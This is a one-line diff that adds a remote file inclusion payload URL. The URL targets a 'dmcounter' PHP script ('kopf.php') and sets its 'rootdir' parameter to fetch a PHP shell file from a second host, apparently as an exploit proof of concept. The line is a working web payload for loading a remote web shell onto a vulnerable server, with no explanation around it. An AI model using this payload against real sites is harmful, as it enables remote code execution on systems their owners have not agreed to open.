@@ -1,0 +1,1 @@
+http://www.example.com/dmcounter/kopf.php?rootdir=http://www.example2.com/phpshell.txt?
